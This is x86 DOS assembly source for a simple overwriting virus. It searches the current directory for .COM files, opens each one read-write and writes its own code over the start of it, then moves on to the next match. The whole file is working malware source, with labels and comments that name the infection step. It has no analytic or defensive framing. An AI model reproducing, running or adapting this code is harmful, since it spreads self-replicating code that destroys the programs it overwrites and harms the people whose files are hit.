.model small

.code

org 100h

start:
	; search all comfiles in current directly
	mov ah, 4eh
	mov dx, offset comfiles
	int 21h
infect:
	jc exit 	;if no files found or no files to infect exit

	mov dx, offset corona
	mov ah, 9h
	int 21h

	;open file and write
	mov dx, 9eh; 	;read file name from DTA
	mov ax, 3d02h	;open file name with RW permission
	int 21h

	;infect the file
	mov bx, ax		;the file handle is in dx so we swap it into bx
	mov dx, 0100h           ;offset from where to copy
	mov cx, endv-start	;number of bytes to copy
	mov ah, 40h		;write to com file
	int 21h

	;close the file
	mov ah, 3eh
	int 21h

	;get the next file that matches our search
	mov ah, 4fh
	int 21h
	jmp infect

exit:
	mov ax, 4c00h
	int 21h

comfiles 	db '*.COM',0h

corona 		db '.','$'

endv:

end start





